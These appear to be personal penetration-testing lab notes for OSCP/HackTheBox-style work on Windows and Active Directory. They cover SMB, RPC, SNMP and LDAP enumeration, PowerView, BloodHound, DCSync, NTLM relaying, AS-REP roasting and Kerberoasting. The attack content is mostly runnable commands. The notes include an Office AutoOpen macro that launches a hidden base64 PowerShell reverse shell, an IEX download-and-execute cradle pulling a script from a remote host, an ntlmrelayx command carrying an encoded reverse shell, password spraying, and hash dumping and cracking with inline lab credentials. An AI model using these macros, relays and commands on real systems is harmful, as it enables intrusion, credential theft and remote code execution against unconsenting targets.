Regular connection with a local tmp dir:
`xfreerdp /u:offsec /p:lab /v:192.168.X.194 /drive:/tmp`
Larger size
`xfreerdp /u:offsec /p:lab /v:192.168.203.10 /size:1920x1080 /smart-sizing`
IGnore the cirt
`xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.232.75 /smart-sizing /size:1920x1080`

### Macros 
Word, PowerPoint, Outlook, Publisher, Access, Excel, and OneNote.

Encode the Powershell command with base64 to UTF-16LE to avoid issues with special characters 

Use the following Python script to split the powershell base64-encoded  string into smaller chunks of 50 characters and concatenate them into the _Str_ variable. To do this, we store the PowerShell command in a variable named _str_ and the number of characters for a chunk in _n_. We must make sure that the base64-encoded command does not contain any line breaks after we paste it into the script. A for-loop iterates over the PowerShell command and prints each chunk in the correct format for our macro.

```py
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."
n = 50
for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```

We can then update our macro, save and close it :

```vb
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    ...
        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
        Str = Str + "A== "

    CreateObject("Wscript.Shell").Run Str
End Sub
```

Next we need to open a webserver to distribute the PowerCat Script and a netcat listener to catch the shell. Opening the document should fetch the script and return a reverse shell.



### SMB
<details>
	<summary>SMB: windows Vs linux</summary>

**SMB (Server Message Block)** is more commonly used on Windows than Linux, primarily due to its native integration and central role in Windows networking. In Linux, SMB is available through Samba and is used primarily for compatibility and interoperability with Windows networks. Here's a brief overview:

##### Windows Systems:
SMB is a core component of Windows networking and is used extensively in these environments. It's the default protocol for file and printer sharing in Windows.
Windows operating systems, starting from Windows for Workgroups, have integrated SMB support for network file and printer access, and it has been enhanced in subsequent versions.
SMB provides numerous features in Windows, such as network file sharing, printer sharing, and access to remote services like named pipes and mail slots.

##### Linux Systems:
In Linux, SMB support is not native but is available through tools like Samba. Samba is an open-source implementation of the SMB/CIFS networking protocol that allows Linux systems to share files and printers with Windows systems.
While Samba is widely used, especially in mixed OS environments (Windows and Unix/Linux), it is not as deeply integrated into the Linux OS as SMB is in Windows.
Linux systems often use other protocols like NFS (Network File System) for file sharing in environments dominated by Unix/Linux systems. However, SMB/Samba is preferred for compatibility in mixed environments with Windows systems.

##### Usage:
SMB's widespread use in Windows is partly due to its deep integration into the operating system, making it the standard choice for Windows-based networking tasks.
In Linux, while SMB/Samba is used, especially for interoperability with Windows systems, it is just one of several options available for network file sharing and is not as predominant as it is in Windows environments.

</details>



### smb ports 
- `135` 
- `139`
- `445` - Means we may be able to read files and if we have an admin we can psexec and get a remote shell

The `$` character at the end of a share name indicates it's an administrative share. Eg..
```
$ smbclient -L \\\\<IP_ADDRESS>\\ADMIN$ -U Administrator
Enter WORKGROUP\Administrator's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```



[Impacket psexec](https://github.com/fortra/impacket/blob/master/examples/psexec.py); A noisy and heavy handed tool. 
## smbclient
"not as good as `smbmap`" - Ippsec ... **however...**
`smbclient -L <IP_ADDRESS> -U Administrator`
```
smbclient -N -L \\\\{TARGET_IP}\\
# -N : No password
# -L : This option allows you to look at what services are available on a server
```

List all the shares available:   (**Note listing, -L AND connecting are incompatible and might break the connection**)
- `smbclient -L <IPADDRES>`
Check access to a specific shares ( eg IPC, USER, Users etc):
- `smbclient //<IPADDRESS>/SHARENAME`
Try and Login
`smbclient \\\\IPADDRESS\\SHARENAME -U Username`
To upload the file to an SMB share (noddy delivery method for a nast *Library-ms file instad of email etc) 
- `smbclient //192.100.201.195/share -c 'put config.library-ms'`
Run in Debug mode 1=low , 10 == highest
- `smbclient -p 4455 -L //192.168.161.63/Scripts -U hr_admin --password=Welcome1234 -d 10    `

```sh
└─# smbclient //10.129.17.50/Replication                                                                                                                           
Password for [WORKGROUP\root]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> recurse ON          # turn on recursive 
smb: \> prompt OFF          # turn off the priomt for each file
smb: \> mget *              # get every readable file
```
## smbmap
```sh
smbmap -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -H <IPADDRESS> # fussy about the order 
smbmap -u svc_tgs -p GPPstillStandingStrong2k18 -d active.htb -H 10.129.17.50 # fussy about the order

smbmap -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -H <IPADDRESS> -r <RecursiveLocalToSearch> --depth=10  
smbmap -u svc_tgs -p GPPstillStandingStrong2k18 -d active.htb -H 10.129.17.50 -r Users --depth=10  

smbmap -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -H <IPADDRESS> --download <FILEPATHTODOWNLOAD>
smbmap -u svc_tgs -p GPPstillStandingStrong2k18 -d active.htb -H 10.129.17.50 --download ./Users/SVC_TGS/Desktop/user.txt 
```
## smbpasswd 

Can set passwords

- `smbpasswd -U <USERNAME> -r <REALM> ....`



### rcpclient tool

- `rpcclient$> <PRESS_TAB>   # gives all modules list` 


[Interesting notes](https://malicious.link/posts/2017/reset-ad-user-password-with-linux/) 
Try an NULL login:
- `rpcclient -U "" <IPADDRESS>`
Try changeing a password
- [rpcclient$> setuserinfo2 <USERNAME> <level> <PASSWORD>](https://malicious.link/posts/2017/reset-ad-user-password-with-linux/)
 ( level set to 23 normally see [here](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN) , without encryption). Result should not retun anything , and that means it worked. 



```
rpcclient -U "" 10.129.215.226 -N        # -N made a difference
rpcclient $> enumdomusers		# others cmds at the bottom)
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]
rpcclient $> 
```

With the user name data in a file users.txt ( HTB - CASCADE)
`cat users.txt | while read line; do echo "$line"| cut -d"[" -f2 | cut -d"]" -f1; done > usersClean.txt`
I then ran `"cat usersClean.txt| while read line; do smbmap -H 10.129.215.226 -u "$line" ; done`

**rpcclient** tool has autocomplete for commnds below and more
```
queryuser: Retrieves detailed information about a specific user.
querygroup: Gets information about a particular group.
netshareenum: Lists all shared resources on the server.
getdompwinfo: Retrieves domain password information.
lookupnames: Resolves names to security identifiers (SIDs).
lookupsids: Converts SIDs to their corresponding names.
enumprivs: Enumerates privileges.
querydominfo: Gets information about the domain.
enumprinters: Lists printers shared on the server.
createdomuser: Creates a new domain user.
deletedomuser: Deletes a domain user.
setuserinfo: Modifies user information.
enumalsgroups: Enumerates local alias groups.
querydispinfo: see if there is anything in a description feild
``` 

## SNMP

```
sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt
```
```
public
private
manager
```

```
#  Make a list of IPs
for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips

# Run 161
onesixtyone -c community -i ips
```


| MIB Value          |  Related Information | 
|:----------------------:|:----------------:|
|  1.3.6.1.2.1.25.1.6.0  | System Processes |
| 1.3.6.1.2.1.25.4.2.1.2 | Running Programs |
| 1.3.6.1.2.1.25.4.2.1.4 |  Processes Path  |
| 1.3.6.1.2.1.25.2.3.1.4 |   Storage Units  |
| 1.3.6.1.2.1.25.6.3.1.2 |   Software Name  |
|  1.3.6.1.4.1.77.1.2.25 |   User Accounts  |
|  1.3.6.1.2.1.6.13.1.3  |  TCP Local Ports |


### Other handy MIB values
System Information MIBs:
System Description: 1.3.6.1.2.1.1.1
System Uptime: 1.3.6.1.2.1.1.3
System Contact: 1.3.6.1.2.1.1.4
System Name: 1.3.6.1.2.1.1.5
System Location: 1.3.6.1.2.1.1.6

#### Interface Information MIBs:
Interface Status: 1.3.6.1.2.1.2.2.1.8
Interface Speed: 1.3.6.1.2.1.2.2.1.5
Interface MAC Address: 1.3.6.1.2.1.2.2.1.6
Interface IP Address: 1.3.6.1.2.1.4.20.1.1
Interface IP Address Table: 1.3.6.1.2.1.4.20

#### Network Performance and Error Statistics:
ICMP Statistics: 1.3.6.1.2.1.5
TCP Connections: 1.3.6.1.2.1.6.13.1
UDP Information: 1.3.6.1.2.1.7

#### Routing Information:
IP Forwarding Table: 1.3.6.1.2.1.4.21
Default Gateway: 1.3.6.1.2.1.4.21.1.7
Routing Table: 1.3.6.1.2.1.4.24

#### Storage and Disk Information:
Disk Storage Table: 1.3.6.1.2.1.25.2.3
Disk Space Usage: 1.3.6.1.2.1.25.2.3.1.6

#### Process and Application Information:  
Process Table: 1.3.6.1.2.1.25.4.2
Installed Software List: 1.3.6.1.2.1.25.6.3.1

#### User and Group Information:
Group Accounts: 1.3.6.1.4.1.77.1.2.3

#### Device Specific MIBs:
Printer MIBs: 1.3.6.1.2.1.43
UPS MIBs: 1.3.6.1.2.1.33

#### Environment Monitoring MIBs:
Temperature Sensors: 1.3.6.1.4.1.674.10892.2.3.1.12
Fan Status: 1.3.6.1.4.1.674.10892.2.3.1.15

```
snmpwalk -c <COMMUNITY_STRING> -v1 <IP_ADDRESS> <MIB_VALUE>
snmpwalk -c <COMMUNITY_STRING> -Oa -v1 <IP_ADDRESS> <MIB_VALUE>    '# convert hex to Ascii
```

## LDAP

- `nmap -n -sV --script "ldap* and not brute" <IP-ADDRESS>`

<details>
	<summary>Some Hashes and IDs in Windows</summary>

Domain\uid: This is the domain and user ID (UID) of the account. For example, "Administrator" is the UID of the account on the domain.

**RID**: The Relative Identifier (RID) is a value that uniquely identifies an account within a domain. In the Windows Security Account Manager (SAM), each user account and group has a unique RID. For example, the built-in Administrator account typically has a RID of 500.

**LM hash**: LAN Manager (LM) hash is an outdated and insecure method to store Windows passwords. It's known for its weaknesses and susceptibility to brute-force attacks. The LM hash is split into two 7-character chunks and hashed separately, creating vulnerabilities. 
In modern systems, you often see it stored as **aad3b435b51404eeaad3b435b51404ee**, which represents a blank or unused LM hash (as LM hashing is typically disabled).


**NT hash**: The NT hash, also known as the NTLM hash, is a more secure way of storing Windows passwords than the LM hash. It uses the MD4 hashing algorithm and does not split the password. It is more resistant to brute-force attacks compared to the LM hash. As an example, `823452073d75b9d1cf70ebdf86c7f98e` is the NT hash of the Administrator's password.

</details>

----

# Active directory

Want to Enumerate:
- Groups and members
- Usernames
- Admin accounts
- The domains
- Computers 
- Operating system details
- dnshostnames
- LDAP paths

Use [net.exe](https://learn.microsoft.com/en-US/troubleshoot/windows-server/networking/net-commands-on-operating-systems), which is installed by default on all Windows operating systems.

```
net user /domain                        # list users and groups
net user jeffadmin /domain              # Specific user info. Is a Domain/Enterprise Admin???
net group /domain                       # looks custom groups not in AD default list
net group "Sales Department" /domain    # look in a specific group

```

In powershell:

```ps
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()                       # AD - Get current domain info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner          # AD - Find PDC
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers     # AD - List domain controllers
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()                       # AD - Get current forest info
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().GlobalCatalogs        # AD - List global catalogs
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().Domains               # AD - List domains in forest
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().SchemaRoleOwner       # AD - Get Schema FSMO role owner
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().DomainNamingRoleOwner # AD - Get Domain Naming FSMO role owner
```
If RAST is installed on the system 
```
Get-ADUser -Filter * -SearchBase "DC=corp,DC=com"                                           # AD (RASRT)- List all users
Get-ADGroup -Filter * -SearchBase "DC=corp,DC=com"                                          # AD (RASRT)- List all groups
Get-ADUser -Identity "username" -Properties MemberOf                                        # AD (RASRT)- List user’s group membership
Get-ADComputer -Filter *                                                                    # AD (RASRT)- List all computers in domain
(Get-ADDomain).DomainControllers                                                            # AD (RASRT)- Get domain controllers list
Get-GPO -All                                                                                # AD (RASRT)- List all Group Policy Objects (GPOs)
Get-ADGroupMember -Identity "Domain Admins"                                                 # AD (RASRT)- List domain admins
Get-ADDefaultDomainPasswordPolicy                                                           # AD (RASRT)- Get domain password policy
Get-ADOrganizationalUnit -Filter *                                                          # AD (RASRT)- List all organizational units
Get-ADTrust -Filter *                                                                       # AD (RASRT)- List domain trust relationships
```

Active Directory AD enumeration can be done on powershell if we lauch with `powershell -ep bypass` . I have the `AD-Enum-Script.ps1`

Function to search different class of objects in AD via ldap. Import with `PS C:\Users\stephanie> Import-Module .\function.ps1`
```powershell
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName

    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    return $DirectorySearcher.FindAll()

}
```
Can be called with 

```powershell
PS C:\Users\stephanie> LDAPSearch -LDAPQuery "(samAccountType=*)"
PS C:\Users\stephanie> LDAPSearch -LDAPQuery "(samAccountType=805306368)"   # users
PS C:\Users\stephanie> LDAPSearch -LDAPQuery "(objectclass=group)"
```



### Powerview script
AD Enumeration with [PowerView](https://powersploit.readthedocs.io/en/latest/Recon/)
- https://powersploit.readthedocs.io/en/latest/Recon/
I thnk it can be found here in Kali: `/usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/powerview.ps1`
Import it to  memory it with `PS C:\Tools> Import-Module .\PowerView.ps1`
A list of possible commands for powerview  - https://powersploit.readthedocs.io/en/latest/Recon/#powerview


To get help on a module use `Get-Help <PowerViewCommandlet>`

```
##           Powerview User based commands in Powerview
Import-Module .\PowerView.ps1                                               # Powerview - Install it in to memory
Get-NetUSer                                                                 # Powerview - Get all details of all users
Get-NetUSer | select cn                                                     # Powerview - Get just the usernames** 
Get-NetUser | select cn,pwdlastset,lastlogon                                # Powerview - Users last logged in , and perhaps no changed PW in a long time
Find-LocalAdminAccess                                                       # Powerview - Has Current user got admin access on other machines? - Can take some time to search all over
Get-DomainPolicy | select -ExpandProperty systemaccess                      # Powerview - Get the password policy
Set-DomainUserPassword -Identity robert -AccountPassword (ConvertTo-SecureString "password123" -AsPlainText -Force)   # Powerview - Change users password
Get-DomainUser -PreauthNotRequired | select name                            # Powerview -  List users who do not need KDC preAuth so are vulne to AS-REP Roasting

## Group based commands in Powerview
Get-NetGroup | select cn                                                    # Powerview - Enumerate Groups
Get-NetGroup "Sales Department" | select member                             # Powerview - see members of a particular group
Get-NetGroup "Enterprise Admins" | select member                            # Powerview - Check group members of a particular group

## Computer based commands in Powerview
Get-NetComputer                                                             # Powerview - List all the computer objects  
Get-NetComputer | select name                                               # Powerview - List all the computer objects by name
Get-NetComputer | select operatingsystem,dnshostname                        # Powerview - List the operating system and the dns hostname
Get-NetComputer | select operatingsystem,distinguishedname                  # Powerview - Get the operating system and the distiguished name 


Get-NetSession -ComputerName <COMPUTER_NAME> -Verbose                       # Powerview - See who is logged on to a computer - (But not always comprehensive. better try `.\PsLoggedon.exe \\<COMPUTER_NAME>   )
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion # Powerview - Get a better sense of the operating system
Get-NetUser | select samaccountname,serviceprincipalname                    # Powerview - Get all acount names, see which are service acounts
Get-NetUser -SPN | select samaccountname,serviceprincipalname               # Powerview - Get the Service principle names in the domain

## Object based commands in Powerview
Get-ObjectAcl -Identity <OBJECT_NAME>                                       # Powerview - Get the Access Controls for a spcific object (user, computer , domain, service etc)
Get-ObjectAcl -Identity <OBJECT_NAME> | select SecurityIdentifier,ActiveDirectoryRights     # Powerview - filter on an objects ACL
Convert-SidToName <SID_VALUE_LONG_STRING_ID>                                # Powerview - Convert a SID to a readable name
Get-ObjectAcl -Identity "<AD-OBJECT>" | ? {$_.ActiveDirectoryRights -eq "<ACE_VALUE>"} | select SecurityIdentifier,ActiveDirectoryRights    # Powerview - Look for objects with ACE privs eg : GenericAll !!

## Domain Shares in Powerview
Find-DomainShare                                                            # Powerview - Look for shares in the domain
Find-DomainShare -CheckShareAccess                                          # Powerview - Look for shares in the domain which the current user has access to
PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\                             # List Sysvol shares
```


```
PS C:\Tools> Find-DomainShare -CheckShareAccess

Name                  Type Remark                 ComputerName
----                  ---- ------                 ------------
docshare                 0 Documentation purposes FILES04.corp.com
Important Files          0                        FILES04.corp.com
ADMIN$          2147483648 Remote Admin           client74.corp.com
```

To list of cat, We can think of these in the following way:
`ls \\FILES04\docshare\docs\alldo-not-share`
`ls \\<COMPUTER_NAME>\<SHARENAME>\docs\alldo-not-share`
Find a file we want:
`PS C:\Tools> cat '\\FILES04.corp.com\Important Files\proof.txt'`




#### PsLoggedOn.exe
```
PS: Get-ChildItem -Path C:\ -Filter "PsLoggedon.exe" -Recurse -ErrorAction SilentlyContinue   # Where is PsLoggedOn.exe on the machine?
PS: .\PsLoggedon.exe \\client74                                                               # PsLoggedOn - See who logged on
```

##### Native to windows commands
```
setspn -L iis_service                                         # List all the service principle names on the domain
net group "Management Department" stephanie /add /domain      # add stephanie to the Managment Department domain group /del can be used as well as /add
```

#### ACEs attackers are intrested in
```
GenericAll                  # ACEs for Full permissions on object - The most powerful
GenericWrite:               # ACEs for Edit certain attributes on the object
WriteOwner:                 # ACEs for Change ownership of the object
WriteDACL:                  # ACEs for Edit ACE's applied to object
AllExtendedRights:          # ACEs for Change password, reset password, etc.
ForceChangePassword:        # ACEs for Password change for object
Self (Self-Membership):     # ACEs for Add ourselves to for example a group
```

```
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```
----

### AD Domain Controller Syncronisation (DC Sync attack)

MimiKatz DC sync on user dave . Needs to be admin etc or Acc with _Replicating Directory Changes/Changes All/Changes in Filtered Set_ 
```
MKTZ# lsadump::dcsync /user:corp\dave                   # DC Sync - on User dave 
echo 08d7a47a6f9f66b97b1bae4178747494 > hashes.dcsync   # DC Sync - Copy the hash to a local file 
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force    # DC Sync - NTLM hash crack mode 1000 
```

Impacket DC Sync attack
```
impacket-secretsdump -just-dc-user <TARGET-USERNAME> <DOMAIN>/<PRIVLEGED-USERNAME>:<PASSSWORD>@<DC-IP>      # DC Sync - comand 
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:'BrouhahaTungPerorateBroom2023!@192.168.172.70'  # DC Sync - Output NTLM is the second half "08d7....7494" of dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
"
```

## Windows Scritps (Misc)
```
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin        # Sprays passwords and automatically obtains users. Password file can be supplied with the "-File" flag, -Admin flag will search for admins too

```

# Sharphound ( AD Data collection )
Call a listener to get a file 
```
Invoke-WebRequest -Uri "http://10.10.14.66/SharpHound.ps1" -OutFile ".\SharpHound.ps1"      # Sharphound - Transfer to the host
powershell -ep bypass                                                                       # Sharphound - permit the scripts
Import-Module .\Sharphound.ps1                                                              # Sharphound - Import into powershell
Get-Help Invoke-BloodHound                                                                  # Sharphound - Gethelp if needed
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"   # Sharphound - Run the full collections
SharpHound.exe --CollectionMethods Session --Loop --Loopduration 00:10:00                   # Sharphound - loop over 10 mins 
```

Transfer the data over to Kali
```
K: sudo systemctl status ssh
K: sudo systemctl start ssh  
PS:>  scp .\SharpHound-DATA.zip kali@192.168.45.237:/home/kali/OSCP/
K: sudo systemctl stop ssh  
```

# BLOODHOUND

## Bloodhound ( AD Data Visulaisation and attack path mappping )

here `bloodhound-python` is the data collector (like `SharpHound.exe`), which can be used remotely and then the data zipped up to put into `bloodhound` 

```sh
sudo apt install bloodhound
sudo pip install bloodhound-python
bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICAL-BANK.LOCAL -ns 10.129.95.180 -c All

zip AD-BH-info.zip *.json  # zip up all the json files from BH-Python
```


## Bloodhound (...but first NEO4J)
- `sudo -apt-get update && sudo apt install bloodhound`
  
1. `neo4j` is the database that needs to be run along side bloodhound. Neo4j also has query language to make custom queries in Bloodhound. 
2. drag the zip in to the Bloodhound UI and it will process the files to allow queries

### neo4j (trouble shooting)
Lets say we forgot our neo4j password.
We can run 
```sh
loacate neo4j | grep auth
/usr/share/neo4j/data/dbms/auth
rm -rf /usr/share/neo4j/data/dbms/auth
```
When you start up neo4j: `neo4j console` you can then go to the web port and reset the password! 

Default Creds `neo4j/neo4j`.

### Bloodhound 
[Bloodhound docs](https://bloodhound.readthedocs.io/en/latest/index.html)

Ippsec prefers to pull it regularly becasue it gets updates often. 
Has the exe's precompiled but doesn't have the BH application.
wget <LINK>

Run collector on target:
- `./Sharphound.exe -c all, gpolocalgroup`

Other options:
```
--stealth       # if you want ot be stealth 
--zipfilename   # good for obfuscating the file name if there is an edr check for *bloodhound*
--encryptzip    # encrypts zp file with random password so domain info cnt be read by any
-gplocalgroup   # Attempt to get Group Policy Objects from computer to correlate and determine members of the relevant local groups on each computer in the domain.
```
#### Start bloodhound:
- `bloodhound --no-sandbox`
Once data has been ingested 
1. Mark things that are owned **as OWNED**.
2. Good start from the queries is `Shortest Path from Owned Principles`

#### Analysis with Bloodhound
- Find all Domain Admins
- FInd principles with [DCSync Rights](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync#dcsync) 
  - You can essential run any command on the domain. Domain controllers need a way to Syncronise so they operate with the same infor. It could also be a Privesc opertunity.
- Look through each item in the `Node Info` tab of BH.
- Right click on an edge or node and read the `ABUSE` ab as this will explain the `prv esc`


#### Data collection stage on a windpows machine
```
# Download and then run Bloodhound
IEX (New-Object Net.Webclient).downloadstring("http://10.10.14.15:8080/SharpHound.ps1")
Invoke-BloodHound -CollectionMethod All, gpolocalgroup
```




----



### What is NTLM (New Technology Lan Manager)?

NTLM is a collection of authentication protocols created by Microsoft. It is a challenge-response
authentication protocol used to authenticate a client to a resource on an Active Directory domain.
It is a type of single sign-on (SSO) because it allows the user to provide the underlying authentication factor
only once, at login.
The NTLM authentication process is done in the following way :
1. The client sends the user name and domain name to the server.
2. The server generates a random character string, referred to as the challenge.
3. The client encrypts the challenge with the NTLM hash of the user password and sends it back to the
server.
4. The server retrieves the user password (or equivalent).
5. The server uses the hash value retrieved from the security account database to encrypt the challenge
string. The value is then compared to the value received from the client. If the values match, the client
is authenticated.

Read: https://www.ionos.com/digitalguide/server/know-how/ntlm-nt-lan-manager/

"NTLM vs NTHash vs NetNTMLv2"

The terminology around NTLM authentication is messy, and even pros misuse it from time to time, so let's
get some key terms defined:

- A **hash function** is a one way function that takes any amount of data and returns a fixed size value.
Typically, the result is referred to as a hash, digest, or fingerprint. 

- An **NTHash** is the output of the algorithm used to store passwords on Windows systems in the SAM
database and on domain controllers. An NTHash is often referred to as an NTLM hash or even just an
NTLM, which is very misleading / confusing.

- When the NTLM protocol wants to do authentication over the network, it uses a challenge / response
model as described above. A **NetNTLMv2 challenge / response** is a string specifically formatted to
include the challenge and response. This is often referred to as a NetNTLMv2 hash, but it's not actually a hash. 

Still, it is regularly referred to as a hash because we attack it in the same manner. You'll see
NetNTLMv2 objects referred to as NTLMv2, or even confusingly as NTLM.

**NTLM protocol vs NTLM Hashing** When NTLM authentication is disabled in a network, it means the `NTLM protocol`is not used for client-server authentication. **However**, the underlying **NTLM hashing** algorithm might still play a role in other parts of the security infrastructure, such as in the Kerberos authentication process. 

#### Create an NTLM hash hash in python 
```py
import hashlib
hash = hashlib.new('md4',<PLAINTEXT_PASSWORD>.encode('utf-16le')).digest().hex()
print(hash)
```

Read: https://book.hacktricks.xyz/windows/ntlm/places-to-steal-ntlm-creds#lfi
These tools:
- https://github.com/SpiderLabs/Responder
- https://github.com/Hackplayers/evil-winr  # With Creds Log into (Remote management) on Windows servers 
  - `evil-winrm -i 10.129.82.210 -u administrator -p badminton`

## Relaying NTLMv2

NTLM Relaying needs 4 things
- A compromised machine
- A ntlmRelay server
- A Reverse shell listener
- The target you want to get the System reverse shell from 

1. Assume we have control of a ***compromised*** machine or we can run powershell commands and we want this machine to relay its auth to the ***Main Target*** Machine
2. Start your local ntlmRelay Server with  
`impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET-IP> -c "powershell -enc ...BASE64-ENCODED-PS-REV-SHELL-1Liner-to-port-9999..."`
3. Start a local net cat listener on port 9999
4. Run a command on the compromised machine to read a share on your local machine with the relay server.
5. The relay server should Relay (forward) on the connection to the Target Machine, along with your encoded reverse shell command. 
6. See the Shell!


### Kebereros
- `sudo apt -y install krb5-user -y` - Kerberos client utilities - ( *nix only ??)
- `sudo apt -y install kinit` - 
-  On mac `https://formulae.brew.sh/formula/krb5`
- `kinit` is a cli tool that allows users to obtain and cache an initial TGT from a KDC.

#### AS-REP Roasting (When no KDC preAuth is required)
 [AS-REP Roasting](https://harmj0y.medium.com/roasting-as-reps-e6179a65216b) - If the KDC is not configured to [(pre)authenticate](https://learn.microsoft.com/en-us/archive/technet-wiki/23559.kerberos-pre-authentication-why-it-should-not-be-disabled) users then it will respond with AS-REP to any other user who asks with an AS-REQ. If we have other known credentials (eg Pete) we can get the TGT of other users to get more creds. The AS-REPly  contains key data which can be cracked(Roasted). 

```
# Linux Based AS-REP Roasting 
impacket-GetNPUsers -dc-ip 192.168.209.70 corp.com/pete   # with petes credentials we can see list is vulnerable to AS-REP Roasting 
impacket-GetNPUsers -dc-ip <DC-IP> -request -outputfile <HASH-OP-FILE> <DOMAIN>/<USER>   # AS-REP Roasting , needs other known creds to the KDC  
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete   # AS-REP Roasting , needs other known creds to the KDC 

# Windows based AS-REP Roasting with Rubeus
./Rubeus.exe asreproast /nowrap

# Targeted AS-REP Roasting: If we have GenericWrite or GenericAll controls on another user we can 
Set-DomainObject -Identity "pete" -Set @{userAccountControl=4194304}    # Powerview - Targetd AS-REP roasign enablement with the flag number for unsetting pre-auth on a ser with GenericWrite and GenericAll 


# Cracking hashes of AS-Reproasting with hashcat
hashcat --help | grep -i "Kerberos"    # look for the AS-RepRoast mode ( I think 18200)
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force  # AS-RepRoasting cracking of the hash
```

### Kerberoasting

In short [Kerberoasting](https://blog.harmj0y.net/redteaming/kerberoasting-revisited/) - An attacker leverages a compromised account to request a further  **TGS** for an **SPN** from the **KDC** and then cracks the hash of that **SPN**.

Kerberos Authentication and Service Principal Names Another common technique of gaining privileges within an Active Directory Domain is “Kerberoasting”, which is an offensive technique created by Tim Medin and revealed at DerbyCon 2014.

Kerberoasting involves extracting a hash of the encrypted material from a Kerberos “Ticket Granting Service” ticket reply (TGS_REP), which can be subjected to offline cracking in order to retrieve the plaintext password. This is possible because the TGS_REP is encrypted using the NTLM password hash of the account in whose context the service instance is running. 

Managed service accounts mitigate this risk, due to the complexity of their passwords, but they are not in active use in many environments. It is worth noting that shutting down the server hosting the service doesn’t mitigate, as the attack doesn’t involve communication with the target service. It is therefore important to regularly audit the purpose and privilege of all enabled accounts.
Kerberos authentication uses Service Principal Names (SPNs) to identify the account associated with a particular service instance. `ldapsearch` can be used to identify accounts that are configured with SPNs. 

```
# Kerberoasting from a windows machine
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast    # with a comprimised user on a host we can try getting the TGS-REP


# kerberos from a Linux machine 
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 -outputfile output.hashes corp.com/pete   # Kerberoasting attack against a TGS for an SPN with obtained credentiasl

hashcat --help | grep -i "Kerberos" # look for the kerberoast mode number (13100 ??)
sudo hashcat -m 13100 hashes.KERBeroast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

If `impacket-GetUserSPNs` throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use `sudo ntpdate <DC-IPADDRESS>`

```
# Targeted Kerberoasting 
setspn -D HTTP/pete.corp.com corp\pete   # Natve Targets kerberoasting  with setspn - IF you have permissive ACE on a user then you could add an SN to their account to do Targeted Kerberoasting on the TGS
